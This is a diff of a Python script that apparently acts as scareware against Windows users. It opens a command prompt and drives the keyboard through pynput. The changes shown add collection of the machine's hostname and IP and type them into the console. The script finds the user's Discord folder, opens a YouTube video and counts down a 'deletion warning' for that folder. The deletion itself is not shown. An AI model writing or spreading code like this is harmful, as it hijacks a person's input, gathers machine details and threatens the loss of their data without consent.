@@ -5,9 +5,12 @@ import random
 import shutil
 import pynput
 import time
+hostname =socket.gethostname()
+ip =socket.gethostbyname(hostname)
 warning1 =252
 login = os.getlogin()
-input("PAUSED")
+print(ip , hostname)
+input("PAUSED\n")
 enter =pynput.keyboard.Key.enter
 keyt =pynput.keyboard.Controller()
 cmd =subprocess.Popen("cmd.exe /K cd c:/")
@@ -20,12 +23,17 @@ keyt.press(enter)
 if os.path.exists("C:/Users/"+login+"/AppData/Roaming/discord/app-1.0.9026"):
  keyt.type("cd C:/Users/"+ login +"/AppData/Roaming/")
  keyt.press(enter)
- time.sleep(2)
+ time.sleep(1)
+ keyt.type(hostname + " ip from running exe: " + ip)
+ time.sleep(0.1)
+ keyt.press(enter)
+ time.sleep(0.5)
+ time.sleep(1)
  os.system("start https://www.youtube.com/watch?v=k64Ptubeu_Q&ab_channel=BlackDragonCZ")
  while warning1 >= 0:
   warning1 =warning1 + -1
   time.sleep(1)
-  print("folder: " + "C:/Users/"+ login +"/AppData/Roaming/discord/app-1.0.9026")
+  print("folder: " + "C:/Users/"+ login +"/AppData/Roaming/discord")
   print("deletion warning")
   print(str(warning1))
  else:
